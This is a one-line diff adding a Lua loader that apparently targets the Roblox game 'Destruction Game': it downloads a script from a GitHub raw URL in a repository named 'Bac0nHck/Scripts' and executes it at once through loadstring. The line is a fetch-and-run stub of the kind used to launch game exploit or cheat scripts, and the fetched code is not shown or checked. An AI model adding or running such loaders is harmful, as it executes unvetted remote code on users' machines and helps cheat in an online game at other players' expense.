@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/Destruction%20Game"))()
